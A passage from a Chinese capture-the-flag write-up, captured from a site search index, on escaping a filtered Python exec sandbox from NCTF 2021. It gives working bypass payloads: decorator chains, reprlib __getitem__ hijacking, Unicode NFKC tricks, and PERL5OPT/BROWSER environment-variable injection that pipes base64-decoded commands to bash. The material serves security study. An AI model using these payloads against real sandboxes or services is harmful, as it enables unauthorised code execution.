\u7684\u5b9e\u73b0\uff0c\u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570: open\u51fd\u6570\u4f1a\u5728\u6ca1\u6709browser\u65f6\u5148\u6ce8\u518c\uff0c\u7136\u540e\u8c03\u7528 browser.open() \u53bb\u6253\u5f00\u5bf9\u5e94\u7684\u7f51\u5740: def open ( url , new = 0 , autoraise = True ): \"\"\"Display url using the default browser. If possible, open url in a location determined by new. - 0: the same browser window (the default). - 1: a new browser window. - 2: a new browser page (\"tab\"). If possible, autoraise raises the window (the default) or not. \"\"\" if _tryorder is None : with _lock : if _tryorder is None : register_standard_browsers () for name in _tryorder : browser = get ( name ) if browser . open ( url , new , autoraise ): return True return False register standard browsers\u51fd\u6570\u4f1a\u8c03\u7528register\u51fd\u6570\u6ce8\u518c\u6d4f\u89c8\u5668\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u5c06\u6d4f\u89c8\u5668\u540d\u5b57\u4e0e\u5bf9\u5e94\u7684\u7c7b\u7ed1\u5b9a\u5728\u4e86\u4e00\u8d77\uff0c\u6211\u4eec\u6ce8\u610f\u5230\u8fd9\u91cc\u4f7f\u7528\u5230\u4e86\u4e00\u4e2a\u73af\u5883\u53d8\u91cf BROWSER \uff0c\u53ef\u4ee5\u5141\u8bb8\u4f7f\u7528\u8005\u8986\u76d6\u81ea\u5df1\u7684\u6d4f\u89c8\u5668\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5176\u6700\u7ec8\u4f1a\u6ce8\u518c\u4e00\u4e2aGenericBrowser\u7c7b: def register_standard_browsers (): global _tryorder _tryorder = [] if sys . platform == 'darwin' : register ( \"MacOSX\" , None , MacOSXOSAScript ( 'default' )) register ( \"chrome\" , None , MacOSXOSAScript ( 'chrome' )) register ( \"firefox\" , None , MacOSXOSAScript ( 'firefox' )) register ( \"safari\" , None , MacOSXOSAScript ( 'safari' )) # OS X can use below Unix support (but we prefer using the OS X # specific stuff) if sys . platform == \"serenityos\" : # SerenityOS webbrowser, simply called \"Browser\". register ( \"Browser\" , None , BackgroundBrowser ( \"Browser\" )) if sys . platform [: 3 ] == \"win\" : # First try to use the default Windows browser register ( \"windows-default\" , WindowsDefault ) # Detect some common Windows browsers, fallback to IE iexplore = os . path . join ( os . environ . get ( \"PROGRAMFILES\" , \"C: \\\\ Program Files\" ), \"Internet Explorer \\\\ IEXPLORE.EXE\" ) for browser in ( \"firefox\" , \"firebird\" , \"seamonkey\" , \"mozilla\" , \"netscape\" , \"opera\" , iexplore ): if shutil . which ( browser ): register ( browser , None , BackgroundBrowser ( browser )) else : # Prefer X browsers if present if os . environ . get ( \"DISPLAY\" ) or os . environ . get ( \"WAYLAND_DISPLAY\" ): try : cmd = \"xdg-settings get default-web-browser\" . split () raw_result = subprocess . check_output ( cmd , stderr = subprocess . DEVNULL ) result = raw_result . decode () . strip () except ( FileNotFoundError , subprocess . CalledProcessError , PermissionError , NotADirectoryError ) : pass else : global _os_preferred_browser _os_preferred_browser = result register_X_browsers () # Also try console browsers if os . environ . get ( \"TERM\" ): if shutil . which ( \"www-browser\" ): register ( \"www-browser\" , None , GenericBrowser ( \"www-browser\" )) # The Links/elinks browsers <http://artax.karlin.mff.cuni.cz/~mikulas/links/> if shutil . which ( \"links\" ): register ( \"links\" , None , GenericBrowser ( \"links\" )) if shutil . which ( \"elinks\" ): register ( \"elinks\" , None , Elinks ( \"elinks\" )) # The Lynx browser <http://lynx.isc.org/>, <http://lynx.browser.org/> if shutil . which ( \"lynx\" ): register ( \"lynx\" , None , GenericBrowser ( \"lynx\" )) # The w3m browser <http://w3m.sourceforge.net/> if shutil . which ( \"w3m\" ): register ( \"w3m\" , None , GenericBrowser ( \"w3m\" )) # OK, now that we know what the default preference orders for each # platform are, allow user to override them with the BROWSER variable. if \"BROWSER\" in os . environ : userchoices = os . environ [ \"BROWSER\" ] . split ( os . pathsep ) userchoices . reverse () # Treat choices in same way as if passed into get() but do register # and prepend to _tryorder for cmdline in userchoices : if cmdline != '' : cmd = _synthesize ( cmdline , preferred = True ) if cmd [ 1 ] is None : register ( cmdline , None , GenericBrowser ( cmdline ), preferred = True ) GenericBrowser.open() \u51fd\u6570\u662f\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\uff0c\u5176\u5b9e\u9645\u4e0a\u8c03\u7528\u4e86 subprocess.open() \u51fd\u6570\u6765\u5b9e\u73b0\u4f7f\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u7684\u76ee\u7684: class GenericBrowser ( BaseBrowser ): \"\"\"Class for all browsers started with a command and without remote functionality.\"\"\" def __init__ ( self , name ): if isinstance ( name , str ): self . name = name self . args = [ \" %s \" ] else : # name should be a list with arguments self . name = name [ 0 ] self . args = name [ 1 :] self . basename = os . path . basename ( self . name ) def open ( self , url , new = 0 , autoraise = True ): sys . audit ( \"webbrowser.open\" , url ) cmdline = [ self . name ] + [ arg . replace ( \" %s \" , url ) for arg in self . args ] try : if sys . platform [: 3 ] == 'win' : p = subprocess . Popen ( cmdline ) else : p = subprocess . Popen ( cmdline , close_fds = True ) return not p . wait () except OSError : return False \u7efc\u4e0a\u6240\u8ff0\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86 BROWSER \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u63a7\u5236\u547d\u4ee4\u6267\u884c\u8c03\u7528\u7684\u547d\u4ee4\uff0c\u6700\u7ec8\u6267\u884c\u7c7b\u4f3c\u4e8e BROWSER https://xkcd.com/353/ \u8fd9\u6837\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u662f\u6ca1\u529e\u6cd5\u63a7\u5236\u547d\u4ee4\u7684\u53c2\u6570\u7684\u3002\u8fd9\u91cc\u5c31\u9700\u8981\u5229\u7528\u5230\u5176\u4ed6\u547d\u4ee4\u7684\u73af\u5883\u53d8\u91cf\u6ce8\u5165\u4e86\u3002 \u5728\u4e00\u822c\u7684linux\u53d1\u884c\u7248\u4e2d\uff0c\u4e00\u822c\u81ea\u5e26\u4e86perl\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00\u4ee5\u53ca\u9ed8\u8ba4\u7684perl\u811a\u672c\uff0c\u4f8b\u5982perldoc\u548cperlthanks\uff0c\u8fd9\u91ccexp\u6700\u7ec8\u4f7f\u7528\u7684\u662fperlthanks/perldoc\u800c\u975e\u4f7f\u7528perl\u7684\u539f\u56e0\u662f\u5982\u679c\u6267\u884c perl https://xkcd.com/353/ \uff0c\u90a3\u4e48perl\u4f1a\u62a5\u9519\u8fd4\u56de\uff0c\u4e0d\u4f1a\u5904\u7406 PERL5OPT \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u800c perldoc \u4e0e perlthanks \u8fd92\u4e2a\u811a\u672c\u5219\u518d\u5904\u7406\u4e86 PERL5OPT \u4e4b\u540e\u8fd4\u56de\uff0c\u8fd9\u7ed9\u4e86\u6211\u4eec\u6700\u7ec8exp\u7684\u673a\u4f1a\u3002 \u6700\u7ec8\u6211\u4eec\u6765\u56de\u987e\u4e00\u4e0bexp\uff0c\u9664\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u70b9\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u4f7f\u7528\u4e86 string.printable \u8fd9\u4e32\u5b57\u7b26\u4e32\u6765\u6784\u9020\u4efb\u610f\u5b57\u7b26\uff0c\u5176\u5305\u542b\u4e86\u6240\u6709\u53ef\u89c1\u7684ascii\u5b57\u7b26\u3002 from string import printable from base64 import b64decode from unicodedata import normalize def translate ( s ): r = \"\" for c in s : r += f \"x[ { printable . find ( c ) } ]+\" return r . rstrip ( \"+\" ) code = f \"\"\" from os import environ from string import printable as x environ[ { translate ( \"PERL5OPT\" ) } ] = { translate ( \"-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;\" ) } environ[ { translate ( \"BROWSER\" ) } ] = { translate ( \"perlthanks\" ) } import antigravity \"\"\" # exp normalize ( \"NFKC\" , code ) for c in 'h\" \\' (@_' : if c in code : print ( \"no!!!!\" ) exit ( 0 ) exec ( code )","title":"python\u53d7\u9650\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0e\u9ed1\u9b54\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#python\u53d7\u9650\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0e\u9ed1\u9b54\u6cd5","text":"","title":"python\u53d7\u9650\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e0e\u9ed1\u9b54\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#\u8d77\u56e0","text":"\u5728NCTF/NJUPTCTF 2021\u4e2d\u6709\u4e00\u9053misc\u9898: \u6211\u4eec\u53ef\u7231\u7684Hex\u9171\u53c8\u6709\u4e86\u4e00\u4e2a\u5f3a\u5927\u7684\u529f\u80fd \uff0c \u53ef\u4ee5\u53bb\u6267\u884c\u591a\u884c\u8bed\u53e5\u60f9 ~ \u4f46\u662f\u4e3a\u4e86\u9632\u6b62\u6709\u4e9b\u5c45\u5fc3\u53f5\u6d4b\u7684\u4eba \uff0c \u6211\u4eec\u4e13\u95e8\u628a\u62ec\u53f7 \uff0c \u5355\u53cc\u5f15\u53f7 \uff0c \u90fd\u8fc7\u6ee4\u6389 \uff0c \u5662\u5bf9\u4e0d\u51c6\u8272\u8272 \uff0c \u6240\u4ee5\u4e5f\u4e0d\u51c6\u51fa\u73b0h\u54df ~ Ubuntu Python3 .6.9 \u5feb\u53bb\u627eHex\u9171 ( QQ : 2821876761 ) \u79c1\u804a\u5427 \u9644\u4ef6 \uff1a https : // nctf . slight - wind . com / misc / hex / runner . py https : // attachment . h4ck . fun : 9000 / misc / hex / runner . py \u5176\u4e2d\u9644\u4ef6\u5185\u5bb9\u5982\u4e0b: import sys from base64 import b64decode code = sys . argv [ 1 ] try : data = b64decode ( code . encode ()) . decode () except : exit ( 0 ) for c in 'h\" \\' (' : if c in data : exit ( 0 ) exec ( data ) \u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u53d7\u9650\u5236\u7684python\u4ee3\u7801\u6267\u884c\uff0c\u4e0d\u80fd\u4f7f\u7528h\uff0c\u5355\u5f15\u53f7\uff0c\u53cc\u5f15\u53f7\uff0c\u5de6\u62ec\u53f7\u5b57\u7b26\u3002\u6211\u4eec\u77e5\u9053\u5728SSTI\u4e2d\u6211\u4eec\u5982\u679c\u7981\u7528\u4e86\u5c0f\u62ec\u53f7\u7684\u8bdd\u662f\u6ca1\u529e\u6cd5\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\uff0c\u4f46\u662f\u5728\u4efb\u610fpython\u4ee3\u7801\u6267\u884c\u7684\u60c5\u51b5\u4e0b\u8fd8\u6709\u8f6c\u673a\u5417\uff1f","title":"\u8d77\u56e0"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#\u6b63\u89e3-\u88c5\u9970\u5668","text":"\u6b63\u89e3\u4e0d\u662f\u672c\u7bc7\u6587\u7ae0\u4e3b\u8981\u8ba8\u8bba\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u4e5f\u4ecb\u7ecd\u4e00\u4e0b\uff0c\u5176\u5b9e\u5c31\u662fpython\u88c5\u9970\u5668\u7684\u6280\u5de7\uff0c\u4e00\u4e2a\u7b80\u5355\u7684python\u88c5\u9970\u5668\u5982\u4e0b: def log ( func ): def wrapper ( * args , ** kw ): print ( \"here is a log\" ) func () return wrapper @log def func (): print ( \"hello world\" ) func () \u8fd9\u91cc\u7684 @log \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u4ed6\u7b49\u4ef7\u4e8e func=log(func) \uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u91cc\u9690\u5f0f\u5305\u542b\u4e86\u51fd\u6570\u8c03\u7528\uff0c\u540c\u65f6 \u88c5\u9970\u5668\u662f\u53ef\u4ee5\u5d4c\u5957\u7684 \uff0c\u5e76\u4e14\u80fd\u591f\u7528\u4e8e \u88c5\u9970\u7c7b \u3002 \u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u4f9d\u7136\u7528\u5230\u4e86\u5c0f\u62ec\u53f7\uff0c\u6211\u4eec\u600e\u6837\u624d\u80fd\u907f\u514d\u8fd9\u4e2a\u60c5\u51b5\u5462\uff1f\u5b9e\u9645\u4e0a\u662f\u7528\u5230\u4e86python\u7684(\u6b8b\u5e9f)\u533f\u540d\u51fd\u6570\uff0c\u4e00\u4e2a\u7b80\u5355\u7684python\u533f\u540d\u51fd\u6570\u5982\u4e0b: func = lambda _ : \"system\" # \u610f\u601d\u662f\u65e0\u8bba\u4f20\u5165\u4ec0\u4e48\u53c2\u6570\u6700\u7ec8\u90fd\u4f1a\u8fd4\u56desystem\u8fd9\u4e2a\u5b57\u7b26\u4e32 print ( func ( \"anything\" )) # system \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5d4c\u5957\u7684\u88c5\u9970\u5668\u53bb\u8c03\u7528 os.system() , \u4f8b\u5982: from os import system c = lambda _ : \"whoami\" @system @c class x : pass \u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(c(x)) \uff0c\u800cc\u51fd\u6570\u4e0d\u7ba1\u4f20\u5165\u4ec0\u4e48\u90fd\u4f1a\u8fd4\u56de\"whoami\"\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u5b9e\u73b0\u547d\u4ee4\u6267\u884c \u8fd9\u91cc\u8fd8\u6709\u6700\u540e\u4e00\u4e2a\u95ee\u9898\u662f\u5982\u4f55\u6784\u9020\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u6ca1\u529e\u6cd5\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u8005\u53cc\u5f15\u53f7\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u4e00\u4e9bpython\u539f\u751f\u7684\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\u67d0\u4e9b\u7c7b\u7684 __doc__ ,\u6bd4\u5982\u5b57\u5178(dict)\u7684doc\u5982\u4e0b: dict() -> new empty dictionary dict(mapping) -> new dictionary initialized from a mapping object's (key, value) pairs dict(iterable) -> new dictionary initialized as if via: d = {} for k, v in iterable: d[k] = v dict(**kwargs) -> new dictionary initialized with the name=value pairs in the keyword argument list. For example: dict(one=1, two=2) \u8fd9\u91cc\u9762\u57fa\u672c\u4e0a\u5b58\u5728\u6211\u4eec\u9700\u8981\u7684\u82f1\u6587\u5b57\u7b26\uff0c\u53ef\u4ee5\u4f7f\u7528 {}.__doc__[index] \u7684\u5f62\u5f0f\u83b7\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6700\u7ec8\u7684exp\u53ef\u4ee5\u662f: from os import system n = {} . __doc__ f = lambda _ : n [ 2 ] + n [ 80 ] + n [ 55 ] + n [ 6 ] + n [ 75 ] + n [ 69 ] + n [ 80 ] + n [ 88 ] # cat flag @system @f class x : pass","title":"\u6b63\u89e3: \u88c5\u9970\u5668"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#\u5bfb\u627e\u975e\u9884\u671f","text":"\u5982\u679c\u6211\u4eec\u4e0d\u4f7f\u7528\u88c5\u9970\u5668\u7684\u65b9\u6cd5\uff0c\u8fd9\u9053\u9898\u76ee\u8fd8\u6709\u505a\u6cd5\u5417\uff1f\u6362\u53e5\u8bdd\u8bf4\u5047\u5982\u6211\u4eec\u4e0d\u5141\u8bb8\u4ee3\u7801\u4e2d\u5b58\u5728@\u8fd9\u4e2a\u5b57\u7b26\uff0c\u8fd9\u9053\u9898\u8fd8\u80fd\u591f\u89e3\u5417\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\u3002 \u6240\u4ee5\u6211\u4eec\u7684\u9898\u76ee\u53d8\u6210: import sys from base64 import b64decode code = sys . argv [ 1 ] try : data = b64decode ( code . encode ()) . decode () except : exit ( 0 ) for c in 'h@\" \\' (' : if c in data : exit ( 0 ) exec ( data ) \u8fd9\u91cc\u6211\u4eec\u91cd\u65b0\u601d\u8003\u4e00\u4e0b\uff0c\u6211\u4eec\u5728\u6ca1\u6709\u5c0f\u62ec\u53f7\u4f7f\u7528\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u6709\u4ec0\u4e48\u80fd\u591f\u4f7f\u7528\u5462\uff1f\u7b54\u6848\u662f\u4e2d\u62ec\u53f7\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u4e2d\u62ec\u53f7\u6839\u636e\u7d22\u5f15\u53bb\u83b7\u53d6\u5bf9\u8c61\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86\u7c7b\u4e2d\u7684 __getitem__ \u65b9\u6cd5\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b: class C : def __getitem__ ( self , key ): return str ( key ) + \"111\" c = C () print ( c [ \"qwe\" ]) # qwe111 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u7684 __getitem__ \u9b54\u672f\u65b9\u6cd5\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u65b9\u6cd5\uff0c\u5f53\u6211\u4eec\u8c03\u7528 c[\"anything\"] \u7684\u662f\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u4e86 c.__getitem__(\"qwe\") \uff0c\u8fd9\u6837\u6211\u4eec\u5373\u4f7f\u6ca1\u6709\u5c0f\u62ec\u53f7\u4e5f\u80fd\u591f\u8fdb\u884c\u51fd\u6570\u8c03\u7528\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8986\u76d6\u67d0\u4e9b\u7c7b\u7684 __getitem__ \u65b9\u6cd5\u4e3a\u4e00\u4e9b\u81ea\u5e26\u65b9\u6cd5\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u4e86\u3002","title":"\u5bfb\u627e\u975e\u9884\u671f"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#\u5931\u8d25\u7684\u5c1d\u8bd5-\u8986\u76d6\u81ea\u5e26\u7c7b\u7684getitem","text":"\u6211\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\u8986\u76d6python\u81ea\u5e26\u7c7b\u7684 __getitem__ \u65b9\u6cd5\uff0c\u4f8b\u5982list\u6216\u8005dict\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u4e4b\u540e\u53d1\u73b0\u8fd9\u662f\u884c\u4e0d\u901a\u7684: \u6240\u4ee5\u6211\u4eec\u7684\u76ee\u7684\u5c31\u662f\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\u80fd\u591f\u8986\u76d6\u5176 __getitem__ \u5e76\u4e14\u80fd\u83b7\u53d6\u5230\u8fd9\u4e2a \u7c7b\u7684\u5b9e\u4f8b \uff0c\u8fd9\u91cc\u7684\u91cd\u70b9\u662f\u83b7\u53d6\u5230\u7c7b\u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u6211\u4eec\u5c31\u7b97\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u7c7b\uff0c\u4e5f\u65e0\u6cd5\u83b7\u53d6\u8fd9\u4e2a\u7c7b\u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a \u83b7\u53d6\u7c7b\u7684\u5b9e\u4f8b\u4e5f\u9700\u8981\u5c0f\u62ec\u53f7","title":"\u5931\u8d25\u7684\u5c1d\u8bd5: \u8986\u76d6\u81ea\u5e26\u7c7b\u7684getitem"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#\u6210\u529f\u7684\u5c1d\u8bd5-python\u6807\u51c6\u5e93\u91cc\u7684\u9b54\u672f","text":"\u6211\u4eec\u5c1d\u8bd5\u4ecepython\u6807\u51c6\u5e93\u4e2d\u627e\u5230\u4e00\u4e2a\u7b26\u5408\u6211\u4eec\u6807\u51c6\u7684\u5e93\uff0cpython\u7684\u6807\u51c6\u5e93\u53c2\u8003 \u8fd9\u91cc \u5728\u4e00\u756a\u5bfb\u627e\u540e\uff0c\u6211\u4eec\u5c06\u76ee\u5149\u6295\u5411 reprlib \u8fd9\u4e2a\u5e93\uff0c\u5b83\u5b8c\u7f8e\u7b26\u5408\u4e86\u6211\u4eec\u7684\u8981\u6c42! \u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5982\u4e0b: import reprlib reprlib . Repr . __getitem__ = exec a = reprlib . aRepr a [ \"print('whoami')\" ] \u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u7684exp\u6784\u9020\u5927\u81f4\u5982\u4e0b: 1. \u4ece\u6807\u51c6\u5e93\u4e2d\u5f15\u5165reprlib\u8fd9\u4e2a\u5e93 2. \u8986\u76d6 reprlib.Repr \u7684 __getitem__ \u65b9\u6cd5\u4e3achr\u65b9\u6cd5 3. \u901a\u8fc7 reprlib.aRepr \u4e2d\u62ec\u53f7\u8c03\u7528\u6784\u9020\u4efb\u610f\u5b57\u7b26\u4e32 4. \u518d\u6b21\u8986\u76d6\u4e3a exec \u65b9\u6cd5 5. \u771f\u6b63\u610f\u4e49\u4e0a\u7684python\u4ee3\u7801\u6267\u884c \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8eh\u4e5f\u88ab\u7981\u7528\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5 reprlib.Repr.__getitem__=chr \uff0c\u9700\u8981\u8d70\u4e00\u4e0b\u5f2f\u8def\uff0c\u5229\u7528builtins\u5e93\u7684 __dict__ \u518d\u5229\u7528\u5b57\u5178\u7684 __doc__ \uff0c\u6211\u4eec\u6700\u7ec8\u5f97\u5230\u4e00\u4e2a\u975e\u5e38\u9177\u7684exp\u5982\u4e0b: data = \"\"\" import reprlib import builtins __=reprlib.aRepr reprlib.Repr.__getitem__ = builtins.__dict__[ {} .__doc__[2]+ {} .__doc__[280]+ {} .__doc__[28]] # chr exp=__[95]+__[95]+__[105]+__[109]+__[112]+__[111]+__[114]+__[116]+__[95]+__[95]+__[40]+__[39]+__[111]+__[115]+__[39]+__[41]+__[46]+__[115]+__[121]+__[115]+__[116]+__[101]+__[109]+__[40]+__[39]+__[119]+__[104]+__[111]+__[97]+__[109]+__[105]+__[39]+__[41] // __import__('os').system('whoami') reprlib.Repr.__getitem__ = exec reprlib.aRepr[exp] \"\"\" for c in 'h@\" \\' (' : if c in data : print ( c ) exit ( 0 ) exec ( data )","title":"\u6210\u529f\u7684\u5c1d\u8bd5: python\u6807\u51c6\u5e93\u91cc\u7684\u9b54\u672f"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/#\u66f4\u8fdb\u4e00\u6b65","text":"\u5b9e\u9645\u4e0apython\u662f\u652f\u6301Non-ASCII Identifies\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528unicode\u5b57\u7b26\u7684\uff0c\u5177\u4f53\u53c2\u8003\u89c1: https://peps.python.org/pep-3131/ \uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u70b9: The following changes will need to be made to the parser: 1. If a non-ASCII character is found in the UTF-8 representation of the source code, a forward scan is made to find the first ASCII non-identifier character (e.g. a space or punctuation character) 2. The entire UTF-8 string is passed to a function to normalize the string to NFKC, and then verify that it follows the identifier syntax. No such callout is made for pure-ASCII identifiers, which continue to be parsed the way they are today. The Unicode database must start including the Other ID property. 3. If this specification is implemented for 2.x, reflective libraries (such as pydoc) must be verified to continue to work when Unicode strings appear in __dict__ slots as keys. \u7a0d\u5fae\u7ffb\u8bd1\u4e00\u4e0b\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u4f7f\u7528\u4e86UTF-8\u4e2d\u7684\u975eASCII\u7801\u4f5c\u4e3a\u6807\u8bc6\u7b26\uff0c\u90a3\u4e48\u5176\u4f1a\u88ab\u51fd\u6570\u8f6c\u6362\u4e3aNFKC\u6807\u51c6\u683c\u5f0f\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 \u02b0 \u6765\u4ee3\u66ff h \uff0c\u4ece\u800c\u7ed5\u8fc7\u9650\u5236\u3002 \u4f46\u662f\u5047\u5982\u6211\u4eec\u7684\u9898\u76ee\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u5148\u8f6c\u6362\u4e3aNFKC\u6807\u51c6\u683c\u5f0f\u518d\u8fdb\u884c\u5224\u65ad\uff0c\u5e76\u4e14\u5c06 _ \u8fd9\u4e2a\u5b57\u7b26\u4e5f\u8fc7\u6ee4\uff0c\uff0c\u6211\u4eec\u8fd8\u6709\u529e\u6cd5\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u5417\uff1f from unicodedata import normalize data = input () data = normalize ( \"NFKC\" , data ) for c in 'h@\" \\' (_' : if c in data : print ( c ) exit ( 0 ) exec ( data ) \u5f88\u660e\u663e\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u518d\u8986\u76d6\u4e00\u4e9b\u9b54\u672f\u65b9\u6cd5(\u56e0\u4e3a\u65b9\u6cd5\u540d\u5305\u542b_)\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u6211\u4eec\u8fd8\u662f\u80fd\u901a\u8fc7\u4e00\u4e9b\u64cd\u4f5c\u6765\u8fdb\u884crce\u7684\uff0c\u8fd9\u4e2arce\u65b9\u5f0f\u5c31\u662f\u73af\u5883\u53d8\u91cf\u6ce8\u5165,\u5177\u4f53\u6587\u7ae0\u53ef\u53c2\u8003 ## HACKING WITH ENVIRONMENT VARIABLES \u6211\u4eec\u8fd9\u91cc\u5148\u8d34\u51fa\u6700\u7ec8\u7684exp\uff0c\u7136\u540e\u518d\u5206\u6790\u5176\u539f\u7406: from string import printable from base64 import b64decode from unicodedata import normalize def translate ( s ): r = \"\" for c in s : r += f \"x[ { printable . find ( c ) } ]+\" return r . rstrip ( \"+\" ) code = f \"\"\" from os import environ from string import printable as x environ[ { translate ( \"PERL5OPT\" ) } ] = { translate ( \"-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;\" ) } environ[ { translate ( \"BROWSER\" ) } ] = { translate ( \"perlthanks\" ) } import antigravity \"\"\" # exp normalize ( \"NFKC\" , code ) for c in 'h\" \\' (@_' : if c in code : print ( \"no!!!!\" ) exit ( 0 ) exec ( code ) \u8fd9\u4e2aexp\u5b9e\u9645\u4e0a\u5229\u7528\u5230\u4e86perl\u7684\u73af\u5883\u53d8\u91cf\u6ce8\u5165\uff0c\u8fd9\u91cc\u4e0d\u5bf9perl\u505a\u8fc7\u591a\u7684\u6df1\u5165\u7814\u7a76\uff0c\u5927\u6982\u539f\u7406\u662f\u5728perl\u8fd0\u884c\u65f6\u4f1a\u4f7f\u7528\u5230 PERL5OPT \u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u6307\u5b9a -M 